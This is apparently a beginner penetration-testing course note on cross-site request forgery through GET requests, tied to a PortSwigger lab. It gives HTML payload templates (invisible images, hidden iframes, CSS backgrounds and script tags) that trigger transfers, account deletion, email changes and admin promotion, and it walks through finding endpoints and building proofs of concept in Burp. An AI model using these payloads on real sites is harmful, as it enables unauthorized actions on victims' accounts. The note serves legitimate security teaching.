---
tags: [vapt, csrf, beginner]
difficulty: beginner
module: "11 - CSRF"
topic: "11.03 CSRF via GET Request"
portswigger_labs: ["CSRF vulnerability with no defenses"]
---

# 11.03 — CSRF via GET Request

## GET-Based CSRF

Some applications perform state-changing actions via GET requests (terrible practice, but it happens). GET-based CSRF is the simplest attack — just trick the victim into visiting a URL.

```
VULNERABLE ENDPOINT:
  GET /user/delete?id=123 HTTP/1.1
  Cookie: session=VICTIM_SESSION
  
  → If victim visits this URL → their account is deleted!

ATTACK VECTOR:
  <img src="https://target.com/user/delete?id=123">
  → Victim's browser loads "image" → request fires → account deleted!
  
  OR:
  <a href="https://target.com/transfer?amount=1000&to=ATTACKER">Click here!</a>
```

---

## GET CSRF Attack Templates

```html
<!-- TEMPLATE 1: IMAGE TAG (no user interaction needed!): -->
<html>
<body>
  <img src="https://target.com/transfer?amount=1000&to=attacker_account" 
       width="0" height="0">
  <!-- 0x0 image = invisible → victim sees nothing! -->
</body>
</html>

<!-- TEMPLATE 2: LINK (requires click): -->
<a href="https://target.com/admin/delete-user?id=123">
  Click to claim your prize!
</a>

<!-- TEMPLATE 3: IFRAME (auto-loads): -->
<iframe src="https://target.com/settings?lang=en&email=attacker@evil.com" 
        style="display:none">
</iframe>

<!-- TEMPLATE 4: CSS BACKGROUND: -->
<style>
  body { 
    background: url('https://target.com/logout'); 
  }
</style>
<!-- → Forces logout when victim views page! -->

<!-- TEMPLATE 5: SCRIPT SRC (auto-executes): -->
<script src="https://target.com/export-api-key?format=json"></script>
<!-- → Triggers the action (though response goes to <script> not attacker) -->
```

---

## SameSite=Lax Partial Protection

```
SameSite=Lax PROTECTS AGAINST:
  POST form CSRF, PUT/DELETE CSRF
  
SameSite=Lax DOES NOT PROTECT AGAINST:
  Top-level GET navigation!
  
  EXAMPLE:
  Cookie: session=abc; SameSite=Lax
  
  GET /transfer?amount=1000&to=attacker → if this is a "top-level navigation"
  (i.e., the user navigates to this URL in their browser's URL bar, or via a link)
  → SameSite=Lax STILL SENDS THE COOKIE!
  
  This means: <a href="..."> CSRF still works with SameSite=Lax!
              <img src="..."> CSRF may also work (browser navigation)!
```

---

## Exploiting GET CSRF — Finding Vulnerable Endpoints

```bash
# LOOK FOR STATE-CHANGING GET ENDPOINTS:
# Methods: GET with parameters that change state

# COMMON EXAMPLES:
GET /logout                    → log victim out
GET /user/delete?id=123        → delete account
GET /settings?email=evil@evil  → change email
GET /admin/promote?user=attacker&role=admin → privilege escalation
GET /unsubscribe?token=xxx     → unsubscribe victim

# LOOK IN BURP HTTP HISTORY:
# Filter by GET requests
# Look for parameters that look like actions (delete, change, set, update, add)

# TEST:
# 1. Find GET endpoint that changes state
# 2. Log in as victim in one browser
# 3. Open attack page in same browser
# 4. See if the action executed
```

---

## Real-World Scenario — Logout CSRF

```html
<!-- MOST BASIC CSRF: FORCE LOGOUT -->

<!-- ATTACKER PAGE: -->
<img src="https://target.com/logout" width="0" height="0">

<!-- EFFECT:
  When victim visits attacker's page, they're logged out of target.com!
  
  Impact may seem low — but:
  1. If victim auto-logs-in (password manager) → attacker logs them in as attacker's account
  2. Combined with session fixation → force user to use specific session
  3. Can cause disruption (DoS of authentication)
  
  Always report logout CSRF as Low severity at minimum! -->
```

---

## Burp Suite — Generate CSRF PoC

```
BURP SUITE AUTO-GENERATES CSRF PoC:
  1. Intercept a GET request in Burp
  2. Right-click → Engagement Tools → Generate CSRF PoC
  3. Burp creates an HTML page that auto-triggers the request
  4. Save as .html → host it or open in browser
  5. If action fires → CSRF confirmed!

ALTERNATIVELY:
  Right-click any request in Burp → Copy as curl
  → Convert to CSRF PoC manually
```

---

## Related Notes
- [[01 - What is CSRF]] — fundamentals
- [[04 - CSRF via POST Request]] — more common form-based CSRF
- [[05 - CSRF Token Bypass Techniques]] — defeating protections
- [[06 - SameSite Cookie Bypass]] — SameSite bypass
